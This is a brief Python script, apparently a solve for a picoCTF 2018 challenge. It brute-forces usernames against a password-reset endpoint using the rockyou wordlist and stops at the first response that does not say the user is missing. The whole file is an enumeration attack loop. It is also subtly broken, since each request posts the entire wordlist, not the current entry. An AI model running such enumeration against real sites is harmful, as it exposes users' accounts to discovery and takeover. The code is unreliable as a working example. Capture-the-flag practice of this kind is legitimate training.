from pwn import *
import requests
url = "http://2018shell1.picoctf.com:26133/reset"

f = open('rockyou.txt','r').read().split('\n')
for c in f:
    p = requests.post(url=url,data={'username':'%s'%(f)})
    if 'User does not exist' in p.text:
        continue
    else:
        print(p.text)
        break

